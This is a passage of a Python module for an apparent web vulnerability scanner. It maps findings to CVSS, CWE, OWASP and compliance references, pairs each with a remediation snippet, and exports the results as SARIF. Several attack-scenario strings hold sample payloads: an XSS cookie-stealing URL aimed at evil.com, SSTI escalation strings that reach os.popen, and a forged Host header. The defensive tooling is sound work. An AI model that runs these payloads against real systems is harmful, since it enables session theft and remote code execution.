            "", "# Use security groups/firewall: allow port 22 only from VPN CIDR",
            []),
    ),

    # ── Cookie Security ───────────────────────────────────────────────────────
    "cookie_no_secure": (
        "Session Cookie Missing Secure Flag",
        CvssVector("N","H","N","N","U","H","N","N"),   # 5.9 MEDIUM
        CweInfo(614, "Sensitive Cookie in HTTPS Session Without 'Secure' Attribute", "Cookie sent over HTTP"),
        "A02",
        ComplianceRefs("Req 6.4.2","CC6.7","A.14.1","PR.DS-2","V3.4.1"),
        "Session cookies can be intercepted over HTTP connections, enabling account takeover.",
        "An attacker on the same network intercepts an HTTP request containing the session cookie — immediately gaining access to the victim's account.",
        RemediationGuide(1, 0.5,
            "Set the Secure flag on all cookies containing sensitive data.",
            "Set-Cookie: session=abc123; HttpOnly",
            "Set-Cookie: session=abc123; HttpOnly; Secure; SameSite=Lax",
            ["https://owasp.org/www-community/controls/SecureCookieAttribute"]),
    ),
    "cookie_no_httponly": (
        "Session Cookie Missing HttpOnly Flag",
        CvssVector("N","L","N","R","U","L","N","N"),   # 4.3 MEDIUM
        CweInfo(1004, "Sensitive Cookie Without 'HttpOnly' Flag", "Cookie accessible via JavaScript"),
        "A07",
        ComplianceRefs("Req 6.4.2","CC6.7","A.14.1","PR.DS-2","V3.4.2"),
        "Session cookies can be stolen via XSS attacks since JavaScript can read them.",
        "An attacker exploits any XSS vulnerability to run `document.cookie` and steal the session token, gaining full account access.",
        RemediationGuide(1, 0.5,
            "Set HttpOnly flag on session and authentication cookies.",
            "Set-Cookie: session=abc123; Secure",
            "Set-Cookie: session=abc123; HttpOnly; Secure; SameSite=Lax",
            []),
    ),
    "cookie_no_samesite": (
        "Cookie Missing SameSite Attribute (CSRF Risk)",
        CvssVector("N","L","N","R","U","L","L","N"),   # 5.4 MEDIUM
        CweInfo(352, "Cross-Site Request Forgery (CSRF)", "Missing SameSite allows CSRF"),
        "A01",
        ComplianceRefs("Req 6.4.2","CC6.6","A.14.1","PR.DS-2","V4.2.2"),
        "Cross-Site Request Forgery attacks can perform actions on behalf of authenticated users.",
        "An attacker crafts a malicious form on their site that automatically submits to your application — if the victim is logged in, the request is processed as authenticated.",
        RemediationGuide(2, 0.5,
            "Set SameSite=Lax (minimum) or SameSite=Strict on all cookies.",
            "Set-Cookie: session=abc123; HttpOnly; Secure",
            "Set-Cookie: session=abc123; HttpOnly; Secure; SameSite=Lax",
            ["https://owasp.org/www-community/SameSite"]),
    ),

    # ── API Spec ──────────────────────────────────────────────────────────────
    "api_spec_swagger_exposed": (
        "Swagger / OpenAPI Specification Publicly Exposed",
        CvssVector("N","L","N","N","U","L","N","N"),   # 5.3 MEDIUM
        CweInfo(538, "File and Directory Information Exposure", "API documentation exposes endpoint structure"),
        "A05",
        ComplianceRefs("Req 6.2.4","CC6.6","A.14.2","",""),
        "A complete map of your API endpoints, parameters, and authentication requirements is publicly available.",
        "An attacker downloads your OpenAPI spec and discovers every internal endpoint, auth bypass routes, and parameter structures — dramatically accelerating their attack.",
        RemediationGuide(3, 1.0,
            "Require authentication to access API documentation in production. Consider disabling it entirely.",
            "app.include_router(swagger_router)  # no auth",
            "# Disable in prod:\nif settings.ENVIRONMENT == 'production':\n    app = FastAPI(openapi_url=None)",
            []),
    ),
    "api_graphql_introspection": (
        "GraphQL Introspection Enabled in Production",
        CvssVector("N","L","N","N","U","L","N","N"),   # 5.3 MEDIUM
        CweInfo(538, "File and Directory Information Exposure", "Full schema exposed via introspection"),
        "A05",
        ComplianceRefs("Req 6.2.4","CC6.6","A.14.2","",""),
        "Your entire GraphQL schema — all types, queries, mutations — is readable by anyone.",
        "An attacker sends an introspection query to map your entire data model, then crafts targeted queries to access internal data.",
        RemediationGuide(2, 1.0,
            "Disable GraphQL introspection in production environments.",
            "schema = build_schema(type_defs)  # introspection on by default",
            "from graphql import build_schema\nfrom ariadne import make_executable_schema\nschema = make_executable_schema(type_defs, disable_introspection=True)",
            ["https://www.apollographql.com/blog/graphql/security/why-you-should-disable-graphql-introspection-in-production/"]),
    ),

    # ── Deep JS / SPA ─────────────────────────────────────────────────────────
    "js_secret_exposed": (
        "Secret or API Key Found in JavaScript Bundle",
        CvssVector("N","L","N","N","U","H","N","N"),   # 7.5 HIGH
        CweInfo(798, "Use of Hard-coded Credentials", "Secret committed to frontend JS"),
        "A07",
        ComplianceRefs("Req 3.4","CC6.1","A.9.4","PR.AC-4","V2.10.1"),
        "Hardcoded secrets in JavaScript are exposed to every visitor — they cannot be revoked without a code change.",
        "An attacker views your page source or JS bundle, extracts the API key, and uses it to access internal APIs, cloud resources, or third-party services.",
        RemediationGuide(1, 1.0,
            "Rotate the secret immediately. Move all secrets to server-side environment variables.",
            "const API_KEY = 'sk-abc123...'  // in frontend JS",
            "# Frontend should never contain secrets.\n# Call your own backend API which uses the secret server-side.",
            []),
    ),
    "js_unauth_api_endpoint": (
        "Unauthenticated API Endpoint Discovered via SPA Crawler",
        CvssVector("N","L","N","N","U","H","N","N"),   # 7.5 HIGH
        CweInfo(306, "Missing Authentication for Critical Function", "API endpoint without auth check"),
        "A01",
        ComplianceRefs("Req 6.2.4","CC6.1","A.9.4","PR.AC-3","V4.1.1"),
        "User data or business functions are accessible without authentication.",
        "An attacker calls the discovered endpoint directly without logging in and retrieves or manipulates user data.",
        RemediationGuide(1, 2.0,
            "Add authentication middleware to all API routes. Verify on every request.",
            "@app.get('/api/users')  # no auth",
            "@app.get('/api/users')\nasync def get_users(current_user = Depends(require_auth)):",
            []),
    ),

    # ── HTML / Template / Injection ────────────────────────────────────────────
    "html_ssti_risk": (
        "Server-Side Template Injection (SSTI) Indicator Detected",
        CvssVector("N","L","N","N","C","H","H","H"),   # 10.0 CRITICAL
        CweInfo(1336, "Improper Neutralization of Special Elements Used in a Template Engine", "SSTI risk detected"),
        "A03",
        ComplianceRefs("Req 6.2.4","CC6.6","A.14.2","PR.AC-4","V5.3.4"),
        "Template injection can lead to full Remote Code Execution on your server.",
        "An attacker injects `{{7*7}}` into a template parameter — if the response shows `49`, they escalate to `{{config.__class__.__init__.__globals__['os'].popen('id').read()}}` and gain shell access.",
        RemediationGuide(1, 4.0,
            "Never pass user input directly to template.render(). Use sandboxed environments.",
            "template = Template(user_input)\nreturn template.render()",
            "# Use Jinja2 SandboxedEnvironment:\nfrom jinja2.sandbox import SandboxedEnvironment\nenv = SandboxedEnvironment()\ntemplate = env.from_string(STATIC_TEMPLATE)\nreturn template.render(user_data=sanitized)",
            ["https://portswigger.net/research/server-side-template-injection"]),
    ),
    "html_api_key_exposed": (
        "API Key or Secret Exposed in HTML Source",
        CvssVector("N","L","N","N","U","H","N","N"),   # 7.5 HIGH
        CweInfo(312, "Cleartext Storage of Sensitive Information", "Secret in HTML page source"),
        "A07",
        ComplianceRefs("Req 3.4","CC6.1","A.9.4","PR.AC-4","V2.10.1"),
        "Any visitor can extract the key by viewing page source and misuse it.",
        "An attacker opens browser DevTools, finds the API key in the HTML source, and uses it to access internal systems or rack up charges on your third-party service account.",
        RemediationGuide(1, 0.5,
            "Rotate the key immediately and move it to server-side environment variables.",
            "", "", []),
    ),

    # ── Active Verifier Results ────────────────────────────────────────────────
    "av_xss_confirmed": (
        "Reflected XSS — Confirmed with Canary Probe",
        CvssVector("N","L","N","R","C","L","L","N"),   # 6.1 MEDIUM
        CweInfo(79, "Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')", "Reflected XSS confirmed"),
        "A03",
        ComplianceRefs("Req 6.2.4","CC6.6","A.14.2","PR.AC-4","V5.3.3"),
        "An attacker can execute JavaScript in the browsers of users who click a crafted link.",
        "An attacker sends a victim a URL like `?q=<script>document.location='evil.com?c='+document.cookie</script>` — the victim's session cookie is stolen upon click.",
        RemediationGuide(1, 4.0,
            "HTML-encode all user-supplied output. Use context-aware escaping.",
            "return f'<div>{user_input}</div>'",
            "from html import escape\nreturn f'<div>{escape(user_input)}</div>'",
            ["https://portswigger.net/web-security/cross-site-scripting"]),
    ),
    "av_cors_confirmed": (
        "CORS Misconfiguration — Confirmed via Canary Probe",
        CvssVector("N","L","N","R","C","H","L","N"),   # 7.4 HIGH
        CweInfo(942, "Permissive Cross-domain Policy with Untrusted Domains", "CORS bypass confirmed"),
        "A05",
        ComplianceRefs("Req 6.2.4","CC6.6","A.14.1","PR.AC-4","V14.4.8"),
        "A live probe confirmed any website can read authenticated API responses on behalf of your users.",
        "An attacker hosts a page that auto-fetches your API with the victim's credentials — silently exfiltrating account data.",
        RemediationGuide(1, 2.0,
            "Replace dynamic origin reflection with a strict allowlist.",
            "resp.headers['ACAO'] = request.headers.get('Origin')",
            "ALLOWED = {'https://app.example.com'}\norigin = request.headers.get('Origin','')\nif origin in ALLOWED:\n    resp.headers['ACAO'] = origin",
            []),
    ),
    "av_path_traversal_confirmed": (
        "Path Traversal — Confirmed with Canary Probe",
        CvssVector("N","L","L","N","U","H","N","N"),   # 6.5 MEDIUM
        CweInfo(22, "Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal')", "Directory traversal confirmed"),
        "A01",
        ComplianceRefs("Req 6.2.4","CC6.1","A.14.2","PR.AC-4","V12.3.1"),
        "An attacker can read arbitrary server files including `/etc/passwd`, application configs, and private keys.",
        "A canary probe confirmed a `../../` sequence reached outside the web root — an attacker can escalate to reading sensitive configuration files or private keys.",
        RemediationGuide(1, 4.0,
            "Validate and canonicalize all file paths. Use allowlists, not blocklists.",
            "path = os.path.join(BASE, user_input)\nreturn open(path).read()",
            "import os\npath = os.path.realpath(os.path.join(BASE, user_input))\nif not path.startswith(os.path.realpath(BASE)):\n    raise PermissionError('Path traversal blocked')",
            ["https://portswigger.net/web-security/file-path-traversal"]),
    ),
    "av_open_redirect_confirmed": (
        "Open Redirect — Confirmed with Canary Probe",
        CvssVector("N","L","N","R","C","L","L","N"),   # 6.1 MEDIUM
        CweInfo(601, "URL Redirection to Untrusted Site ('Open Redirect')", "Redirect to canary domain confirmed"),
        "A01",
        ComplianceRefs("Req 6.2.4","CC6.6","A.14.2","","V5.1.5"),
        "Your domain can be used to redirect users to any attacker-controlled site, enabling phishing.",
        "A canary probe confirmed redirection to an external domain — attackers can craft `https://yoursite.com/?next=https://phishing.com` as a trusted-looking phishing URL.",
        RemediationGuide(1, 2.0, "Enforce strict allowlist validation on all redirect parameters.",
            "", "", []),
    ),
    "av_ssti_confirmed": (
        "Server-Side Template Injection — Confirmed (RCE Risk)",
        CvssVector("N","L","N","N","C","H","H","H"),   # 10.0 CRITICAL
        CweInfo(1336, "Improper Neutralization of Special Elements Used in a Template Engine", "SSTI confirmed via arithmetic probe"),
        "A03",
        ComplianceRefs("Req 6.2.4","CC6.6","A.14.2","PR.AC-4","V5.3.4"),
        "A live arithmetic probe confirmed template execution — full Remote Code Execution is likely achievable.",
        "Arithmetic injection was confirmed. An attacker can escalate to `{{''.__class__.__mro__[1].__subclasses__()}}` to achieve full RCE and take over the server.",
        RemediationGuide(1, 8.0,
            "STOP using user input in templates. This is a critical RCE vulnerability.",
            "", "", ["https://portswigger.net/research/server-side-template-injection"]),
    ),
    "av_host_injection_confirmed": (
        "Host Header Injection — Confirmed",
        CvssVector("N","L","N","N","C","L","L","N"),   # 6.5 MEDIUM
        CweInfo(113, "Improper Neutralization of CRLF Sequences in HTTP Headers", "Host header reflected in response"),
        "A05",
        ComplianceRefs("Req 6.2.4","CC6.6","A.14.2","","V5.3.7"),
        "Password reset links and cache poisoning attacks can use a forged Host header.",
        "An attacker sends a password reset request with `Host: evil.com` — the reset link email contains `evil.com/reset?token=...`, directing the victim to the attacker's domain.",
        RemediationGuide(1, 2.0,
            "Validate the Host header against a whitelist. Use absolute URLs from config, not from Host.",
            "reset_url = f'https://{request.headers[\"Host\"]}/reset?token={token}'",
            "DOMAIN = settings.BASE_URL  # from config, not from request\nreset_url = f'{DOMAIN}/reset?token={token}'",
            ["https://portswigger.net/web-security/host-header"]),
    ),
    "av_crlf_confirmed": (
        "CRLF Injection — Confirmed in HTTP Response",
        CvssVector("N","L","N","N","C","L","L","N"),   # 6.5 MEDIUM
        CweInfo(113, "Improper Neutralization of CRLF Sequences in HTTP Headers ('HTTP Response Splitting')", "CRLF confirmed"),
        "A03",
        ComplianceRefs("Req 6.2.4","CC6.6","A.14.2","","V5.3.2"),
        "An attacker can inject arbitrary HTTP headers or split responses to poison caches or steal cookies.",
        "A CRLF canary was confirmed in the HTTP response — an attacker can inject `Set-Cookie` headers or split the response to serve malicious content.",
        RemediationGuide(1, 2.0,
            "Strip or encode `\\r\\n` from all user input before writing to HTTP headers.",
            "response.headers['Location'] = user_input",
            "import re\nsafe = re.sub(r'[\\r\\n]', '', user_input)\nresponse.headers['Location'] = safe",
            []),
    ),
}

# ─────────────────────────────────────────────────────────────────────────────
# Internal raw finding (pre-enrichment)
# ─────────────────────────────────────────────────────────────────────────────

@dataclass
class _RawFinding:
    finding_type: str       # key into _FINDING_DB
    tool:         str       # source tool name
    endpoint:     str = ""
    parameter:    str = ""
    evidence:     str = ""
    confirmed:    bool  = False
    confidence:   float = 0.5


# ─────────────────────────────────────────────────────────────────────────────
# Per-tool extraction functions
# ─────────────────────────────────────────────────────────────────────────────

def _iter_ssl(url: str, data: dict) -> Iterator[_RawFinding]:
    issues  = data.get("issues", []) or []
    protos  = data.get("protocols", {}) or {}
    ciphers = data.get("cipher_suite", "") or ""

    for issue in issues:
        il = str(issue).lower()
        if "tls 1.0" in il or "tlsv1.0" in il:
            yield _RawFinding("ssl_tls_v1_0", "ssl", url, evidence=str(issue))
        elif "tls 1.1" in il or "tlsv1.1" in il:
            yield _RawFinding("ssl_tls_v1_1", "ssl", url, evidence=str(issue))
        elif any(k in il for k in ("weak cipher", "rc4", "des", "export", "null cipher")):
            yield _RawFinding("ssl_weak_cipher", "ssl", url, evidence=str(issue))
        elif any(k in il for k in ("expir", "days", "renew")):
            yield _RawFinding("ssl_cert_expiring_soon", "ssl", url, evidence=str(issue))
        elif "self-signed" in il or "self signed" in il:
            yield _RawFinding("ssl_self_signed", "ssl", url, evidence=str(issue))
        elif "hsts" in il and "missing" in il:
            yield _RawFinding("hsts_missing", "ssl", url, evidence=str(issue))

    for proto, enabled in protos.items():
        p = str(proto).lower()
        if enabled:
            if "1.0" in p:
                yield _RawFinding("ssl_tls_v1_0", "ssl", url)
            elif "1.1" in p:
                yield _RawFinding("ssl_tls_v1_1", "ssl", url)

    if ciphers:
        for weak in ("RC4", "DES", "3DES", "EXPORT", "NULL", "ANON"):
            if weak in ciphers.upper():
                yield _RawFinding("ssl_weak_cipher", "ssl", url, evidence=ciphers)
                break


def _iter_headers(url: str, data: dict) -> Iterator[_RawFinding]:
    missing = data.get("missing_headers", []) or []
    for h in missing:
        hl = str(h).lower()
        if "content-security-policy" in hl or "csp" in hl:
            yield _RawFinding("header_csp_missing", "headers", url, evidence=h)
        elif "x-frame" in hl:
            yield _RawFinding("header_xframe_missing", "headers", url, evidence=h)
        elif "x-content-type" in hl:
            yield _RawFinding("header_xcto_missing", "headers", url, evidence=h)
        elif "referrer" in hl:
            yield _RawFinding("header_referrer_missing", "headers", url, evidence=h)
        elif "strict-transport" in hl or "hsts" in hl:
            yield _RawFinding("header_hsts_missing", "headers", url, evidence=h)


def _iter_cors_csp(url: str, data: dict) -> Iterator[_RawFinding]:
    for issue in data.get("cors_issues", []) or []:
        il = str(issue).lower()
        if "wildcard" in il or "allow-origin: *" in il or "acao: *" in il:
            yield _RawFinding("cors_wildcard", "cors_csp", url,
                              evidence=str(issue), confidence=0.9)
        elif "null" in il and "origin" in il:
            yield _RawFinding("cors_null_origin", "cors_csp", url, evidence=str(issue))
    for issue in data.get("csp_issues", []) or []:
        il = str(issue).lower()
        if "unsafe-inline" in il:
            yield _RawFinding("csp_unsafe_inline", "cors_csp", url, evidence=str(issue))
        elif "missing" in il:
            yield _RawFinding("header_csp_missing", "cors_csp", url, evidence=str(issue))


def _iter_dns(url: str, data: dict) -> Iterator[_RawFinding]:
    if data.get("spf_missing") or any("spf" in str(i).lower() for i in data.get("spf_issues", []) or []):
        yield _RawFinding("dns_spf_missing", "dns", url)
    if data.get("dmarc_missing") or any("dmarc" in str(i).lower() for i in data.get("dmarc_issues", []) or []):
        yield _RawFinding("dns_dmarc_missing", "dns", url)
    if data.get("caa_missing") or data.get("no_caa"):
        yield _RawFinding("dns_caa_missing", "dns", url)
    if data.get("dnssec_missing") or not data.get("dnssec_valid"):
        yield _RawFinding("dns_dnssec_missing", "dns", url)
    for issue in data.get("spf_issues", []) or []:
        if "softfail" in str(issue).lower() or "~all" in str(issue):
            yield _RawFinding("dns_spf_missing", "dns", url, evidence=str(issue), confidence=0.6)


def _iter_hsts(url: str, data: dict) -> Iterator[_RawFinding]:
    if not data.get("is_preloaded", True):
        yield _RawFinding("hsts_not_preloaded", "hsts_preload", url,
                          evidence=data.get("hsts_header", ""))
    max_age = data.get("max_age", 0) or 0
    if max_age and max_age < 10_886_400:   # < 126 days (PCI requirement)
        yield _RawFinding("hsts_not_preloaded", "hsts_preload", url,
                          evidence=f"max-age={max_age} (too short)")


def _iter_open_redirect(url: str, data: dict) -> Iterator[_RawFinding]:
    for r in data.get("confirmed_redirects", []) or []:
        ep  = str(r.get("url", url)).split("?")[0]
        par = str(r.get("param", ""))
        yield _RawFinding("open_redirect_confirmed", "open_redirect", ep,
                          parameter=par, evidence=str(r), confirmed=True, confidence=0.95)
    # Only emit candidates if no confirmed already emitted
    if not data.get("confirmed_redirects"):
        for r in data.get("candidates", []) or []:
            ep  = str(r.get("url", url)).split("?")[0]
            par = str(r.get("param", ""))
            yield _RawFinding("open_redirect_candidate", "open_redirect", ep,
                              parameter=par, evidence=str(r), confidence=0.5)


def _iter_waf(url: str, data: dict) -> Iterator[_RawFinding]:
    if not data.get("detected") and not data.get("waf_name"):
        yield _RawFinding("waf_not_detected", "waf", url, confidence=0.8)


def _iter_exposure(url: str, data: dict) -> Iterator[_RawFinding]:
    for path in data.get("sensitive_paths", []) or []:
        pl = str(path).lower()
        if ".env" in pl:
            yield _RawFinding("exposure_env_file", "exposure", url + "/" + path.lstrip("/"),
                              evidence=path, confidence=0.95)
        elif ".git" in pl:
            yield _RawFinding("exposure_git_dir", "exposure", url + "/" + path.lstrip("/"),
                              evidence=path, confidence=0.95)
        elif any(k in pl for k in (".bak", ".zip", ".tar", ".sql", ".backup")):
            yield _RawFinding("exposure_backup_file", "exposure", url + "/" + path.lstrip("/"),
                              evidence=path, confidence=0.9)
    for issue in data.get("http_issues", []) or []:
        if "trace" in str(issue).lower():
            yield _RawFinding("exposure_http_trace", "exposure", url, evidence=str(issue))


def _iter_tech(url: str, data: dict) -> Iterator[_RawFinding]:
    for vuln in data.get("known_vulnerabilities", []) or []:
        yield _RawFinding("tech_vulnerable_component", "tech", url,
                          evidence=str(vuln), confidence=0.9)
    fp = data.get("fingerprint", {}) or {}
    for key in ("server", "x-powered-by", "x-generator"):
        if fp.get(key):
            yield _RawFinding("tech_version_disclosure", "tech", url,
                              evidence=f"{key}: {fp[key]}", confidence=0.8)


def _iter_subdomain_takeover(url: str, data: dict) -> Iterator[_RawFinding]:
    for sub in data.get("vulnerable_subdomains", []) or []:
        yield _RawFinding("subdomain_takeover_vulnerable", "subdomain_takeover",
                          str(sub), evidence=str(sub), confirmed=True, confidence=0.95)


def _iter_port_scanner(url: str, data: dict) -> Iterator[_RawFinding]:
    db_ports = {3306, 5432, 27017, 6379, 1433, 5984, 9200, 9300}
    admin_ports = {22, 3389, 8443, 8080, 9090}
    for port_info in data.get("open_ports", []) or []:
        port = int(port_info.get("port", 0) if isinstance(port_info, dict) else port_info)
        ep   = f"{url}:{port}"
        if port in db_ports:
            yield _RawFinding("port_db_exposed", "port_scanner", ep,
                              evidence=str(port_info), confidence=0.9)
        elif port in admin_ports:
            yield _RawFinding("port_sensitive_open", "port_scanner", ep,
                              evidence=str(port_info), confidence=0.8)


def _iter_cookie_security(url: str, data: dict) -> Iterator[_RawFinding]:
    for cookie in data.get("issues", []) or []:
        if not isinstance(cookie, dict):
            continue
        missing = cookie.get("missing_flags", []) or []
        ep = url
        for flag in missing:
            fl = str(flag).lower()
            if "secure" in fl:
                yield _RawFinding("cookie_no_secure", "cookie_security", ep,
                                  evidence=cookie.get("name", ""), confidence=0.95)
            elif "httponly" in fl:
                yield _RawFinding("cookie_no_httponly", "cookie_security", ep,
                                  evidence=cookie.get("name", ""), confidence=0.95)
            elif "samesite" in fl:
                yield _RawFinding("cookie_no_samesite", "cookie_security", ep,
                                  evidence=cookie.get("name", ""), confidence=0.95)


def _iter_api_spec(url: str, data: dict) -> Iterator[_RawFinding]:
    for spec in data.get("exposed_specs", []) or []:
        sl = str(spec).lower()
        if "swagger" in sl or "openapi" in sl:
            yield _RawFinding("api_spec_swagger_exposed", "api_spec",
                              url + "/" + str(spec).lstrip("/"),
                              evidence=str(spec), confidence=0.9)
        elif "graphql" in sl and "introspec" in sl:
            yield _RawFinding("api_graphql_introspection", "api_spec",
                              url, evidence=str(spec), confidence=0.9)
    if data.get("graphql_introspection_enabled"):
        yield _RawFinding("api_graphql_introspection", "api_spec", url,
                          evidence="introspection: true", confidence=0.95)


def _iter_deep_js(url: str, data: dict) -> Iterator[_RawFinding]:
    for secret in data.get("secrets_found", []) or []:
        yield _RawFinding("js_secret_exposed", "deep_js_crawler", url,
                          evidence=str(secret), confidence=0.85)
    skip_prefixes = ("chrome-extension://", "data:", "blob:", "about:")
    for call in data.get("api_calls", []) or []:
        ep = call.get("url", "") if isinstance(call, dict) else str(call)
        if any(ep.startswith(p) for p in skip_prefixes):
            continue
        if not call.get("authenticated", True) if isinstance(call, dict) else True:
            yield _RawFinding("js_unauth_api_endpoint", "deep_js_crawler",
                              ep, evidence=str(call), confidence=0.7)


def _iter_html(url: str, data: dict) -> Iterator[_RawFinding]:
    for issue in data.get("template_issues", []) or []:
        il = str(issue).lower()
        if any(k in il for k in ("ssti", "template", "expression", "inject")):
            yield _RawFinding("html_ssti_risk", "html", url, evidence=str(issue))
    for secret in data.get("exposed_secrets", []) or []:
        yield _RawFinding("html_api_key_exposed", "html", url, evidence=str(secret))


def _iter_active_verifier(url: str, av_results: list) -> Iterator[_RawFinding]:
    """Process active_verifier.VerificationResult objects."""
    if not av_results:
        return
    _AV_MAP = {
        "OPEN_REDIRECT":        "av_open_redirect_confirmed",
        "REFLECTED_XSS":        "av_xss_confirmed",
        "CORS_MISCONFIGURATION":"av_cors_confirmed",
        "PATH_TRAVERSAL":       "av_path_traversal_confirmed",
        "HOST_HEADER_INJECTION":"av_host_injection_confirmed",
        "SSTI":                 "av_ssti_confirmed",
        "CRLF_INJECTION":       "av_crlf_confirmed",
    }
    for r in av_results:
        if not r.is_confirmed:
            continue
        vuln_name = r.vuln_type.value if hasattr(r.vuln_type, "value") else str(r.vuln_type)
        ftype = _AV_MAP.get(vuln_name)
        if not ftype:
            continue
        poc = ""
        if r.raw_poc_request:
            try:
                poc = r.raw_poc_request.to_curl()
            except Exception:
                poc = str(r.raw_poc_request)
        yield _RawFinding(
            ftype, "active_verifier",
            endpoint  = getattr(r, "endpoint", url),
            parameter = getattr(r, "parameter", ""),
            evidence  = poc or str(r.status),
            confirmed = True,
            confidence= float(getattr(r, "confidence_score", 0.9)),
        )


_TOOL_EXTRACTORS = {
    "ssl":               _iter_ssl,
    "headers":           _iter_headers,
    "cors_csp":          _iter_cors_csp,
    "dns":               _iter_dns,
    "hsts_preload":      _iter_hsts,
    "open_redirect":     _iter_open_redirect,
    "waf":               _iter_waf,
    "exposure":          _iter_exposure,
    "tech":              _iter_tech,
    "subdomain_takeover":_iter_subdomain_takeover,
    "port_scanner":      _iter_port_scanner,
    "cookie_security":   _iter_cookie_security,
    "api_spec":          _iter_api_spec,
    "deep_js_crawler":   _iter_deep_js,
    "html":              _iter_html,
}


# ─────────────────────────────────────────────────────────────────────────────
# Enrichment engine
# ─────────────────────────────────────────────────────────────────────────────

def _make_finding_id(finding_type: str, endpoint: str, tool: str) -> str:
    """Deterministic ID so the same finding always gets the same ID (for dedup / diff)."""
    key = f"{finding_type}|{endpoint}|{tool}"
    short = hashlib.sha256(key.encode()).hexdigest()[:8].upper()
    return f"ACS-{short}"


def _enrich(raw: _RawFinding) -> SecurityFinding | None:
    """Look up the finding type in _FINDING_DB and build a SecurityFinding."""
    entry = _FINDING_DB.get(raw.finding_type)
    if not entry:
        _log.debug("Unknown finding_type %r — skipped", raw.finding_type)
        return None

    title, cvss_vec, cwe, owasp_key, compliance, business_impact, attack_scenario, remediation = entry
    owasp  = _OWASP[owasp_key]
    cvss   = calculate_cvss31(cvss_vec)

    # Confirmed findings get +0.1 CVSS score bump (attacker certainty)
    if raw.confirmed and cvss.score < 9.9:
        bump_score = _roundup(min(cvss.score + 0.1, 10.0))
        sev = next(s for threshold, s in _SEVERITY_THRESHOLDS if bump_score >= threshold)
        cvss = CvssScore(vector=cvss_vec, score=bump_score, severity=sev)

    return SecurityFinding(
        finding_id      = _make_finding_id(raw.finding_type, raw.endpoint, raw.tool),
        title           = title,
        finding_type    = raw.finding_type,
        tool            = raw.tool,
        severity        = cvss.severity,
        cvss            = cvss,
        cwe             = cwe,
        owasp           = owasp,
        compliance      = compliance,
        business_impact = business_impact,
        attack_scenario = attack_scenario,
        remediation     = remediation,
        endpoint        = raw.endpoint,
        parameter       = raw.parameter,
        evidence        = raw.evidence,
        confirmed       = raw.confirmed,
        confidence      = raw.confidence,
    )


def enrich_scan_result(
    scan_result: dict,
    *,
    av_results: list | None = None,
) -> list[SecurityFinding]:
    """
    Main public API.

    Takes a raw scan_result dict (from run_url_security_audit or demo meta)
    and returns a deduplicated, CVSS-scored list of SecurityFinding objects,
    sorted by CVSS score descending.

    Args:
        scan_result: dict with keys: url, tool_results, critical_findings, ...
        av_results:  optional list of VerificationResult from active_verifier

    Returns:
        list[SecurityFinding] — sorted highest severity first
    """
    url          = scan_result.get("url", "")
    tool_results = scan_result.get("tool_results", {}) or {}
    findings: list[SecurityFinding] = []
    seen: set[str] = set()   # deduplication by finding_id

    # 1. Extract from structured tool outputs
    for tool_key, extractor in _TOOL_EXTRACTORS.items():
        tool_data = tool_results.get(tool_key)
        if not isinstance(tool_data, dict):
            continue
        try:
            for raw in extractor(url, tool_data):
                f = _enrich(raw)
                if f and f.finding_id not in seen:
                    seen.add(f.finding_id)
                    findings.append(f)
        except Exception as exc:
            _log.warning("Extractor %s failed: %s", tool_key, exc)

    # 2. Process active verifier results
    if av_results:
        try:
            for raw in _iter_active_verifier(url, av_results):
                f = _enrich(raw)
                if f and f.finding_id not in seen:
                    seen.add(f.finding_id)
                    findings.append(f)
        except Exception as exc:
            _log.warning("Active verifier extraction failed: %s", exc)

    # 3. Sort: confirmed first, then CVSS descending
    findings.sort(key=lambda f: (not f.confirmed, -f.cvss.score))
    return findings


# ─────────────────────────────────────────────────────────────────────────────
# SARIF 2.1.0 export — GitHub Code Scanning / GitLab SAST compatible
# ─────────────────────────────────────────────────────────────────────────────

_SARIF_SCHEMA = (
    "https://raw.githubusercontent.com/oasis-tcs/sarif-spec/master/"
    "Schemata/sarif-schema-2.1.0.json"
)
_TOOL_VERSION = "6.0.0"


def _sarif_level(severity: str) -> str:
    return _SARIF_LEVEL.get(severity, "note")


def to_sarif_json(
    findings: list[SecurityFinding],
    *,
    target_url: str = "",
    scan_id:    str = "",
) -> dict:
    """
    Produce a SARIF 2.1.0 document from a list of enriched findings.

    Compatible with:
      - GitHub Code Scanning (upload via actions/upload-sarif)
      - GitLab SAST report artifact
      - Any SARIF-aware security dashboard

    The `security-severity` property follows GitHub's schema extension:
    9.0–10.0 → critical, 7.0–8.9 → high, 4.0–6.9 → medium, <4.0 → low
    """
    # Build rule index: one rule per unique finding_type
    rules_by_type: dict[str, dict] = {}
    for f in findings:
        if f.finding_type not in rules_by_type:
            rules_by_type[f.finding_type] = {
                "id":   f.sarif_rule_id,
                "name": f.finding_type.replace("_", " ").title().replace(" ", ""),
                "shortDescription": {"text": f.title},
                "fullDescription":  {"text": f.attack_scenario},
                "help": {
                    "text":     f.remediation.summary or f.attack_scenario,
                    "markdown": (
                        f"**CVSS:** {f.cvss.score} ({f.cvss.severity})\n\n"
                        f"**CWE:** [{f.cwe.label}]({f.cwe.url})\n\n"
                        f"**OWASP:** {f.owasp.label}\n\n"
                        f"**Impact:** {f.business_impact}\n\n"
                        f"**Fix:** {f.remediation.summary}"
                    ),
                },
                "defaultConfiguration": {
                    "level": _sarif_level(f.severity),
                },
                "properties": {
                    "tags": [
                        "security",
                        f.owasp.code.lower() + "-" + str(f.owasp.year),
                        f.cwe.label.lower().replace("-", ""),
                    ],
                    "precision": "high" if f.confirmed else "medium",
                    "problem.severity": _sarif_level(f.severity),
                    "security-severity": str(f.cvss.score),
                },
            }

    rule_list  = list(rules_by_type.values())
    rule_index = {ftype: i for i, ftype in enumerate(rules_by_type)}

    results = []
    for f in findings:
        uri = f.endpoint or target_url or "unknown"

        result: dict = {
            "ruleId":    f.sarif_rule_id,
            "ruleIndex": rule_index[f.finding_type],
            "level":     f.sarif_level,
            "message":   {
                "text": (
                    f"{f.title}. "
                    f"CVSS {f.cvss.score} ({f.cvss.severity}). "
                    f"{f.attack_scenario}"
                    + (f" Evidence: {f.evidence}" if f.evidence else "")
                )
            },
            "locations": [
                {
                    "physicalLocation": {
                        "artifactLocation": {
                            "uri":       uri,
                            "uriBaseId": "%SRCROOT%",
                        }
                    }
                }
            ],
            "properties": {
                "cvss_v3":     str(f.cvss.score),
                "cvss_vector": f.cvss.vector.vector_string,
                "cwe":         f.cwe.label,
                "owasp":       f.owasp.label,
                "confirmed":   f.confirmed,
                "confidence":  f.confidence,
                "finding_id":  f.finding_id,
            },
        }

        if f.parameter:
